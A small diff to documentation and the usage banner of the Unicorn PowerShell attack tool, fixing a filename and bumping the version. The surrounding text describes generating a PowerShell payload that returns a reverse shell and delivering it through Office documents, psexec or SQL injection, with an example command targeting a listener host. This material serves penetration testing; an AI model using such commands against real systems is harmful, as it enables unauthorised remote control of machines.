@@ -162,7 +162,7 @@ Everything is now generated in two files, powershell_attack.txt and unicorn.rc. 
 of the code needed in order to inject the powershell attack into memory. Note you will need a place that
 supports remote command injection of some sort. Often times this could be through an excel/word  doc or
 through psexec_commands inside of Metasploit, SQLi, etc.. There are so many implications and  scenarios to
-where you can use this attack at. Simply paste the powershell_attacks.txt command in any command prompt
+where you can use this attack at. Simply paste the powershell_attack.txt command in any command prompt
 window or where you have the ability to call the powershell executable and it will give a shell back to
 you. This attack also supports windows/download_exec for a payload method instead of just Meterpreter
 payloads.
@@ -211,7 +211,7 @@ In order to use this attack, run the following examples:
 python unicorn.py <payload> <lhost> <lport> dde
 python unicorn.py windows/meterpreter/reverse_https 192.168.5.5 443 dde
 
-Once generated, a powershell_attacks.txt will be generated which contains the Office code, and the
+Once generated, a powershell_attack.txt will be generated which contains the Office code, and the
 unicorn.rc file which is the listener component which can be called by msfconsole -r unicorn.rc to
 handle the listener for the payload.
 
@@ -255,7 +255,7 @@ The last one will use a 500 character string instead of the default 380, resulti
 
 # usage banner
 def gen_usage():
-    print("-------------------- Magic Unicorn Attack Vector v2.9 -----------------------------")
+    print("-------------------- Magic Unicorn Attack Vector v2.9.1 -----------------------------")
     print("\nNative x86 powershell injection attacks on any Windows platform.")
     print("Written by: Dave Kennedy at TrustedSec (https://www.trustedsec.com)")
     print("Twitter: @TrustedSec, @HackingDave")
